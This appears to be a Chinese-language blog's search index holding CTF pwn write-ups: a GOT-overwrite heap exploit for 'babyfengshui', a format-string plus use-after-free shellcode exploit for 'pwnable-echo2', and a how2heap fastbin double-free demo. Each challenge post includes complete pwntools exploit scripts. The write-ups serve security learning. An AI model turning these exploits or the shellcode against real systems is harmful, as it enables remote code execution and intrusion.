<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【buuCTF刷题】babyfengshui</title>
    <url>/2024/12/29/%E3%80%90buuCTF%E5%88%B7%E9%A2%98%E3%80%91babyfengshui/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>这道题利用布置堆的结构缺陷get shell，非常精妙。一开始我没有理清”指针”和”指针指向的内容”这两个概念，迟迟搞不明白，以后尤其是堆题要特别注意。</p>
<p>还有个疑问还没有解决：既然description2的内容作为system的参数，EXP 为什么不能这样写？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">add(0x80,&#x27;CCCC&#x27;,0x80,&#x27;cccc&#x27;)</span><br><span class="line">……</span><br><span class="line">update(2,0x10,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(2)</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><blockquote>
<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2JhYnlmZW5nc2h1aV8zM2MzXzIwMTY=">https://buuoj.cn/challenges#babyfengshui_33c3_2016<i class="fa fa-external-link-alt"></i></span><br>libc在这里获取：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9yZXNvdXJjZXM=">https://buuoj.cn/resources<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>checksec 发现Partial RELRO，说明got表可写，没有开PIE<br><img src="/./images/p6/image.png"></p>
<p>IDA里分析，可以看到是一道经典的菜单堆题，对函数做一些重命名，我们有增、删、查、更新操作<br><img src="/./images/p6/image-2.png"></p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>这道题有个Alarm clock，所以先将这个call alarm 给NOP掉<br><img src="/./images/p6/image-3.png"><br><img src="/./images/p6/image-4.png"><br>再来看程序逻辑<br><img src="/./images/p6/image-6.png"><br>add——添加description大小、name、text长度、text<br>display——展示name和description（description其实就是text）<br>update——更新text长度、text（也就是改变description内容）<br>delete就不用讲了</p>
<p>下面看看具体的程序实现，看add和update就够用了</p>
<h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><p><img src="/./images/p6/image-1.png"><br>首先为description分配我们输入的大小的空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">description = malloc(size);</span><br><span class="line">memset(description, 0, size);</span><br></pre></td></tr></table></figure>
<p>接着为name分配了固定0x80大小的空间，并存放指向description堆的指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name = malloc(0x80u);</span><br><span class="line">memset(name, 0, 0x80u);</span><br><span class="line">*name = description;  </span><br></pre></td></tr></table></figure>
<p>然后又用一个指针指向了chunk name</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*(&amp;ptr + byte_804B069) = name;</span><br></pre></td></tr></table></figure>
<p>调用get_name获取name之后，调用update函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;name: &quot;);</span><br><span class="line">get_name(*(&amp;ptr + byte_804B069) + 4, 124); </span><br><span class="line">//为什么是*(&amp;ptr + byte_804B069) + 4呢？因为*(&amp;ptr + byte_804B069)指向了chunk name，而chunk name的前四个字节存放的是指向chunk description的指针</span><br><span class="line">update(byte_804B069++);</span><br></pre></td></tr></table></figure>
<p>update函数等一下看，理一下这些chunk和指针的关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ptr + byte_804B069 指向 chunk name ---&gt; *(&amp;ptr + byte_804B069) == &amp;chunk_name</span><br><span class="line">chunk name 指向chunk description   ---&gt; **(&amp;ptr + byte_804B069) == &amp;chunk_description</span><br></pre></td></tr></table></figure>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p><img src="/./images/p6/image-7.png"><br>先输入一个text length</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;text length: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%u%c&quot;, &amp;text_length, &amp;v2);</span><br></pre></td></tr></table></figure>

<p>然后做一个判断，如果chunk_description的地址加上text_length的长度超过name的地址，程序会认为发生堆溢出——覆盖chunk name的数据了，就会exit；如果没有溢出，就可以修改text(description)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( (text_length + **(&amp;ptr + a1)) &gt;= *(&amp;ptr + a1) - 4 )</span><br><span class="line">//if ( (text_length + &amp;chunk_description) &gt;= &amp;chunk_name - 4 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;my l33t defenses cannot be fooled, cya!&quot;);</span><br><span class="line">  exit(1);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;text: &quot;);</span><br><span class="line">get_name(**(&amp;ptr + a1), text_length + 1);</span><br></pre></td></tr></table></figure>

<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>在glibc中，变量申请堆时，堆管理器先在bins中找有没有符合的chunk，如果没有就从TOP chunk中割出相应大小的空间给变量。在ADD操作中，我们连续申请了两块chunk，一般情况下这两块chunk在空间中是连续存放的。比如我们申请size of description的大小为0x80</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def add(size,name,length,text):</span><br><span class="line">        io.sendlineafter(&#x27;Action: &#x27;,&#x27;0&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;description: &#x27;,str(size))</span><br><span class="line">        io.sendlineafter(&#x27;name: &#x27;,str(name))</span><br><span class="line">        io.sendlineafter(&#x27;length: &#x27;,str(length))</span><br><span class="line">        io.sendlineafter(&#x27;text: &#x27;,text)</span><br><span class="line">add(0x80,&#x27;AAAA&#x27;,0x80,&#x27;aaaa&#x27;)</span><br></pre></td></tr></table></figure>
<p>ADD会连续申请两块连续的0x88的chunk<br><img src="/./images/p6/image-11.png"><br>这时候想update 更新description的内容时，他先做一个判断，只要填充的description没有覆盖到name，就不会exit退出。同样的再ADD几次都是连续申请空间<br><img src="/./images/p6/image-12.png"><br>那么如果description 和 name 在空间上不连续呢？如果我们先删除chunk 0，chunk_description和chunk_name合并为一个chunk，归入unsortbins中</p>
<p><img src="/./images/p6/image-16.png"><br>再ADD这样一个对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x100,&#x27;DDDD&#x27;,0x150,&#x27;dddd&#x27;)</span><br></pre></td></tr></table></figure>
<p>首先新的chunk_description3需要0x108大小的chunk，而Unsortbins中的chunk就有0x110的大小，那么堆管理器就会将这块空间给chunk_description3。而为chunk_name3分配0x88大小的chunk时，由于Bins中没有符合的chunk，就会在TOP chunk中割下来0x88的大小给name3。这时，chunk_description3和chunk_name3在空间上不再连续了，我们就可以利用update任意改写他们之间的空间内容<br><img src="/./images/p6/image-15.png"><br>那么通过以下几步就可以获取shell</p>
<ol>
<li>修改指向description1指针为free的got表地址，当我们输出（display）description的内容时，因为它指向的是free的got表地址，display就会输出free的真实地址<blockquote>
<p>还记得前面说的吗？chunk name的前四个字节存放的是指向chunk description的指针，所以payload要填充0x108+0x88+0x8个垃圾数据，就能来到指向description1的指针</p>
</blockquote>
</li>
<li>计算libc基地址，得到system的真实地址</li>
<li>修改description1的内容为system(update(1,0x10,system_addr))，<strong>因为指向description1的指针是free_got，而内容现在是system_addr，所以程序在调用free时，实际上调用了system函数，也就是说free被劫持为system</strong></li>
<li>我们知道delete会调用free，我们可以在创建description2的时候内容写为”&#x2F;bin&#x2F;sh\x00”，然后free2时，free(**(&amp;ptr + a1))就相当于时system(‘&#x2F;bin&#x2F;sh’)，拿到shell</li>
</ol>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">x64_32 = 1</span><br><span class="line">if x64_32:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;amd64&#x27;)</span><br><span class="line">else:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :io.send(data)</span><br><span class="line">sa      = lambda delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = lambda num                :io.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">itr     = lambda                    :io.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l64     = lambda      :u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">l32     = lambda      :u32(io.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">#########################################################################################</span><br><span class="line">io = process(&#x27;./pwn&#x27;)</span><br><span class="line">#io = remote(&#x27;node5.buuoj.cn&#x27;,)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/kuban/Desktop/pwn/buuctf/libc/libc-2.23-16-32.so&#x27;)</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">def add(size,name,length,text):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;0&#x27;)</span><br><span class="line">        sla(&#x27;description: &#x27;,str(size))</span><br><span class="line">        sla(&#x27;name: &#x27;,str(name))</span><br><span class="line">        sla(&#x27;length: &#x27;,str(length))</span><br><span class="line">        sla(&#x27;text: &#x27;,text)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;1&#x27;)</span><br><span class="line">        sla(&#x27;index: &#x27;,str(index))</span><br><span class="line">def update(index,length,text):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;3&#x27;)</span><br><span class="line">        sla(&#x27;index: &#x27;,str(index))</span><br><span class="line">        sla(&#x27;text length: &#x27;,str(length))</span><br><span class="line">        sla(&#x27;text: &#x27;, text)</span><br><span class="line">def display(index):</span><br><span class="line">        sla(&#x27;Action: &#x27;,&#x27;2&#x27;)</span><br><span class="line">        sla(&#x27;index: &#x27;,str(index))</span><br><span class="line"></span><br><span class="line">add(0x80,&#x27;AAAA&#x27;,0x80,&#x27;aaaa&#x27;)</span><br><span class="line">add(0x80,&#x27;BBBB&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">add(0x80,&#x27;CCCC&#x27;,0x80,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">add(0x100,&#x27;DDDD&#x27;,0x100,&#x27;dddd&#x27;)</span><br><span class="line">payload = b&#x27;e&#x27;*(0x108+0x88+0x8) + p32(free_got)</span><br><span class="line">update(3,0x200,payload)</span><br><span class="line">display(1)</span><br><span class="line">io.recvuntil(&#x27;description: &#x27;)</span><br><span class="line">free_addr = u32(io.recv(4))</span><br><span class="line">libc_base = free_addr - libc.sym[&#x27;free&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">leak(&#x27;system_addr = &#x27;,system_addr)</span><br><span class="line">update(1,0x80,p32(system_addr))</span><br><span class="line">delete(2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>buuCTF刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>babyfengshui</tag>
        <tag>Partial RELRO</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/11/02/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>【buuCTF刷题】pwnable-echo2</title>
    <url>/2024/12/10/%E3%80%90buuCTF%E5%88%B7%E9%A2%98%E3%80%91pwnable-echo2/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>第一次做堆——UAF 的题，感觉堆对代码能力的要求更高，并且IDA分析出来的也要辩证的去看，比如函数指针数组，他可能会分析成这样，我们就要知道func[0] &#x3D;echo1;func[1] &#x3D;echo2;func[2] &#x3D;echo3<br><img src="/./images/p5/1.png"><br>注意64位程序格式化字符串漏洞中：<br>    %0$p &lt;=&#x3D;&gt; rdi &lt;=&#x3D;&gt; printf的第一个参数<br>    %1$p &lt;=&#x3D;&gt; rsi &lt;=&#x3D;&gt; printf的第二个参数</p>
<span id="more"></span>

<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><blockquote>
<p>题目链接：<a href="https://buuoj.cn/challenges#pwnable_echo2">https://buuoj.cn/challenges#pwnable_echo2</a></p>
</blockquote>
<p>Checksec，64位，保护全关<br><img src="/./images/p5/2.png"><br>IDA分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rax</span><br><span class="line">  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF</span><br><span class="line">  __int64 v6[4]; // [rsp+10h] [rbp-20h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">  o = malloc(0x28uLL);</span><br><span class="line">  *(o + 3) = greetings;</span><br><span class="line">  *(o + 4) = byebye;</span><br><span class="line">  printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%24s&quot;, v6);</span><br><span class="line">  v3 = o;</span><br><span class="line">  *o = v6[0];</span><br><span class="line">  v3[1] = v6[1];</span><br><span class="line">  v3[2] = v6[2];</span><br><span class="line">  id = v6[0];</span><br><span class="line">  getchar();</span><br><span class="line">  func[0] = echo1;</span><br><span class="line">  qword_602088 = echo2;</span><br><span class="line">  qword_602090 = echo3;</span><br><span class="line">  for ( i = 0; i != &#x27;y&#x27;; i = getchar() )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;\n- select echo type -&quot;);</span><br><span class="line">        puts(&quot;- 1. : BOF echo&quot;);</span><br><span class="line">        puts(&quot;- 2. : FSB echo&quot;);</span><br><span class="line">        puts(&quot;- 3. : UAF echo&quot;);</span><br><span class="line">        puts(&quot;- 4. : exit&quot;);</span><br><span class="line">        printf(&quot;&gt; &quot;);</span><br><span class="line">        __isoc99_scanf(&quot;%d&quot;, &amp;i);</span><br><span class="line">        getchar();</span><br><span class="line">        if ( i &gt; 3 )</span><br><span class="line">          break;</span><br><span class="line">        (func[i - 1])();</span><br><span class="line">      &#125;</span><br><span class="line">      if ( i == 4 )</span><br><span class="line">        break;</span><br><span class="line">      puts(&quot;invalid menu&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup();</span><br><span class="line">    printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;bye&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序分两段看，进入for循环前进行一系列内存空间布局，程序的内存空间是这样的<br><img src="/./images/p5/3.png"><br>__isoc99_scanf(“%24s”, v6);会覆盖到o,o+1和o+2的位置<br>进入for循环，让我们选择三种漏洞利用方式：BOF(echo1) , FSB(echo2)和UAF(echo3)，分别看一下这三个函数</p>
<ol>
<li>echo1 废物一个<br><img src="/./images/p5/4.png"></li>
<li>echo2 是一个简单的格式化字符串漏洞，format在栈上，可以泄露rbp地址<br><img src="/./images/p5/5.png"></li>
<li>echo3 给变量s分配一个0x20的大小，然后输出我们输入的内容，最后free掉s的chunk，注意free之后没有将指针置零，所以可能存在UAF漏洞<br><img src="/./images/p5/6.png"><br>继续往下看，注意这里<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  if ( i == 4 )</span><br><span class="line">    break;</span><br><span class="line">  puts(&quot;invalid menu&quot;);</span><br><span class="line">&#125;</span><br><span class="line">cleanup();</span><br><span class="line">printf(&quot;Are you sure you want to exit? (y/n)&quot;);</span><br></pre></td></tr></table></figure>
当我们选择”- 4. : exit”时，他会询问我们一次”Are you sure you want to exit? (y&#x2F;n)”，我们再输入”y”时，程序才会真的退出，如果输入”n”，程序还是回到循环中继续选择。<strong>但是无论怎么样，都执行了cleanup()函数，而cleanup()是将最开始的那个o指针free掉了。</strong><br><img src="/./images/p5/7.png"><br>如果我们只是骗一下程序假装要退出，让他执行cleanup，然后输入n，会发生什么呢，首先free掉的chunk会被fastbins链起来<br><img src="/./images/p5/8.png"><br>输入n，再次进入循环，该选择哪个漏洞函数呢？当然是echo3<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 echo3()</span><br><span class="line">&#123;</span><br><span class="line">  char *s; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  (*(o + 3))(o);</span><br><span class="line">  s = malloc(0x20uLL);</span><br><span class="line">  get_input(s, 0x20);</span><br><span class="line">  puts(s);</span><br><span class="line">  free(s);</span><br><span class="line">  (*(o + 4))(o);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
因为echo3 malloc的大小是0x20，我们fastbins中的chunk大小是0x28，所以echo3中的s分配到的内存就是o的chunk<br><img src="/./images/p5/9.png"><br>我们最多向这个chunk写入0x20的字节，也就是o,o+1,o+2,o+3。在被free掉之后，我们写入的内容依然存在，在fastbins中的地址也没有发生变化<br><strong>这就够了，将o+3——也就是greetings()覆盖为shellcode的地址，再次进入echo3时，就会执行shellcode</strong><br>那么shellcode从哪来呢？<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;hey, what&#x27;s your name? : &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%24s&quot;, v6);</span><br></pre></td></tr></table></figure>
忘掉他了吗？我们往栈上的v6（写入小于24字节的shellcode，然后用echo2中的格式化字符串漏洞泄露rbp地址，然后rbp-0x20就可以啦，参数偏移量10（因为是64位程序，要算上6个寄存器）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,b&#x27;2&#x27;)</span><br><span class="line">io.sendline(b&#x27;%10$pAAAA&#x27;)</span><br><span class="line">rbp = int(io.recvuntil(&#x27;AAAA&#x27;,drop=True),16)</span><br><span class="line">shellcode_addr = rbp - 0x20</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">x64_32 = 1</span><br><span class="line">if x64_32:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;amd64&#x27;)</span><br><span class="line">else:</span><br><span class="line">        context(os = &#x27;linux&#x27;,log_level = &quot;debug&quot;,arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">s       = lambda data               :io.send(data)</span><br><span class="line">sa      = lambda delim,data         :io.sendafter(str(delim), data)</span><br><span class="line">sl      = lambda data               :io.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :io.sendlineafter(str(delim), data)</span><br><span class="line">r       = lambda num                :io.recv(num)</span><br><span class="line">ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)</span><br><span class="line">rl      = lambda                    :io.recvline()</span><br><span class="line">itr     = lambda                    :io.interactive()</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">leak    = lambda name,addr          :log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">l64     = lambda      :u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))</span><br><span class="line">l32     = lambda      :u32(io.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">######################################################################################################</span><br><span class="line">#io = process(&#x27;./echo2&#x27;)</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,27765)</span><br><span class="line"></span><br><span class="line">shellcode = b&#x27;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&#x27;</span><br><span class="line">sla(&#x27;name? : &#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">sl(&#x27;%10$pAAAA&#x27;)</span><br><span class="line">ru(b&#x27;0x&#x27;)</span><br><span class="line">rbp_addr = int(ru(b&#x27;AAAA&#x27;),16)</span><br><span class="line">shellcode_addr = rbp_addr - 0x20</span><br><span class="line">leak(&#x27;shellcode_addr-----&gt;&#x27;, shellcode_addr)</span><br><span class="line"></span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br><span class="line">sla(&#x27;(y/n)&#x27;,&#x27;n&#x27;)</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">sla(&#x27;\n&#x27;,b&#x27;a&#x27;*24 + p64(shellcode_addr))</span><br><span class="line">sla(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>buuCTF刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>fmt</tag>
        <tag>UAF</tag>
        <tag>pwnable_echo2</tag>
      </tags>
  </entry>
  <entry>
    <title>【堆利用】fastbin-attack学习总结</title>
    <url>/2024/11/19/%E3%80%90%E5%A0%86%E5%88%A9%E7%94%A8%E3%80%91fastbin-attack%E7%AF%87/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>本篇中的demo均来自 <em><a href="https://github.com/shellphish/how2heap">how2heap</a></em> 中的例子</p>
<p>华庭师傅的 <em><a href="https://github.com/kubansec/Ebooks/blob/main/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">《glibc内存管理ptmalloc源代码分析》</a></em> 是一个很好的glibc机制入门资料，值得精读</p>
<p>由于我使用的glibc为2.35，glibc在2.26引入了tcache chunk，所以我们演示fastbin攻击要先填满tcache，然后也不能用malloc(size)，而是用calloc(1,size)，因为calloc()不会去从tcache中查找堆块，这样能保证我们操作的chunk全部位于fastbin</p>
<span id="more"></span>

<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p>演示一个基于 fastbin 的double-free攻击。 </p>
<h2 id="fastbin-dup-c-源代码"><a href="#fastbin-dup-c-源代码" class="headerlink" title="fastbin_dup.c 源代码"></a>fastbin_dup.c 源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 禁用标准输出缓冲区</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line"></span><br><span class="line">    // 填满 tcache</span><br><span class="line">    void *ptrs[8];</span><br><span class="line">    for (int i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">        ptrs[i] = malloc(8);</span><br><span class="line">    &#125;</span><br><span class="line">    for (int i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">        free(ptrs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;1.calloc三个chunk\n&quot;);</span><br><span class="line">    int *a = calloc(1, 8);</span><br><span class="line">    int *b = calloc(1, 8);</span><br><span class="line">    int *c = calloc(1, 8);</span><br><span class="line"></span><br><span class="line">    printf(&quot;第1次 calloc(1, 8): %p\n&quot;, a);</span><br><span class="line">    printf(&quot;第2次 calloc(1, 8): %p\n&quot;, b);</span><br><span class="line">    printf(&quot;第3次 calloc(1, 8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;2.然后依次释放 a,b,a 的chunk...\n&quot;);</span><br><span class="line">    free(a);</span><br><span class="line">    free(b);</span><br><span class="line">    free(a);</span><br><span class="line">    printf(&quot;现在fast bins链表为 [ %p, %p, %p ]\n&quot;, a , b , a) ;</span><br><span class="line"></span><br><span class="line">    printf(&quot;3.如果我们再分配3个chunk，将会得到%p\n&quot;, a);</span><br><span class="line">    a = calloc(1, 8);</span><br><span class="line">    b = calloc(1, 8);</span><br><span class="line">    c = calloc(1, 8);</span><br><span class="line">    printf(&quot;第1次 calloc(1, 8): %p\n&quot;, a);</span><br><span class="line">    printf(&quot;第2次 calloc(1, 8): %p\n&quot;, b);</span><br><span class="line">    printf(&quot;第3次 calloc(1, 8): %p\n&quot;, c);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>编译运行（gcc记得加上”-g”参数，用gdb调试时会很方便）</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/images/p4/image-19.png"></h2><p>接下来我们在pwndbg里面看，下好断点运行</p>
<h2 id="1-分配三个chunk"><a href="#1-分配三个chunk" class="headerlink" title="1.分配三个chunk"></a>1.分配三个chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *a = calloc(1, 8); </span><br><span class="line">int *b = calloc(1, 8);</span><br><span class="line">int *c = calloc(1, 8);</span><br></pre></td></tr></table></figure>

<p>分配三个chunk，查看堆<br><img src="/images/p4/image-5.png"></p>
<p>使用parseheap查看堆结构更清晰<br><img src="/images/p4/image-11.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 记录三个chunk的起始地址</span><br><span class="line">chunk a: 0x555555559390</span><br><span class="line">chunk b: 0x5555555593b0</span><br><span class="line">chunk c: 0x5555555593d0</span><br></pre></td></tr></table></figure>

<p>查看bins，可以看到此时bins（除了tcache）都是空的<br><img src="/images/p4/image-6.png"></p>
<h2 id="2-依次释放-a-b-a-的chunk"><a href="#2-依次释放-a-b-a-的chunk" class="headerlink" title="2.依次释放 a,b,a 的chunk"></a>2.依次释放 a,b,a 的chunk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(a);</span><br><span class="line">free(b);</span><br><span class="line">free(a);</span><br></pre></td></tr></table></figure>
<p>依次释放 a,b,a 的chunk，查看每次free后的bins的情况<br><img src="/images/p4/image-7.png" alt="free(a)"><br><img src="/images/p4/image-8.png" alt="free(b)"><br><img src="/images/p4/image-9.png" alt="free(a)"><br>可以看到，<strong>fastbins 是一个单链表，fastbins会将free掉的chunk添加到了链表的头部。</strong></p>
<blockquote>
<p>Q: 为什么不直接free(a)之后接着free(a)呢？<br>A: 由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，但是我们可以在两次 free(a) 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。</p>
</blockquote>
